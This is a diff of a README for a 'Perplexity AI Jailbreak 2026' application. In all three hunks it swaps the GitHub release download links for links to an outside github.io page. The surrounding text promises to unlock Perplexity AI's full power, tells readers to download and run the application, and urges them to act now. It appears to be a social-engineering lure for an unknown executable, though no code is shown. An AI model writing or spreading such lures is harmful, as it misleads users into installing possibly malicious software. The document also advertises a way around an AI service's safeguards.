@@ -1,6 +1,6 @@
 # 🔓 perplexity-ai-jailbreak-2026 - Unlock Full AI Search Power Today
 
-[![Download Now](https://img.shields.io/badge/Download-Perplexity_AI_Jailbreak_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Involute-esther2007/perplexity-ai-jailbreak-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Perplexity_AI_Jailbreak_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://involute-esther2007.github.io)
 
 ## 🎯 What Is This?
 
@@ -24,7 +24,7 @@ Getting started is incredibly easy. You do not need any technical skills or prog
 
 Visit this link to download the application. The download button is clearly visible on the page. Click it and the file will start downloading automatically.
 
-[![Download Perplexity AI Jailbreak 2026](https://img.shields.io/badge/⬇️_Download-Perplexity_AI_Jailbreak_2026-4CAF50?style=for-the-badge)](https://github.com/Involute-esther2007/perplexity-ai-jailbreak-2026/releases)
+[![Download Perplexity AI Jailbreak 2026](https://img.shields.io/badge/⬇️_Download-Perplexity_AI_Jailbreak_2026-4CAF50?style=for-the-badge)](https://involute-esther2007.github.io)
 
 ### 🖥️ Step 2: Run the Application
 
@@ -119,7 +119,7 @@ Perplexity AI Jailbreak 2026 is the ultimate solution for anyone who wants the f
 
 Remember, the download link is right here:
 
-[![Get Your Copy Now](https://img.shields.io/badge/🚀_Get_Your_Copy-Perplexity_AI_Jailbreak_2026-FF5722?style=for-the-badge)](https://github.com/Involute-esther2007/perplexity-ai-jailbreak-2026/releases)
+[![Get Your Copy Now](https://img.shields.io/badge/🚀_Get_Your_Copy-Perplexity_AI_Jailbreak_2026-FF5722?style=for-the-badge)](https://involute-esther2007.github.io)
 
 Do not wait. Unlock the true potential of Perplexity AI right now.
 
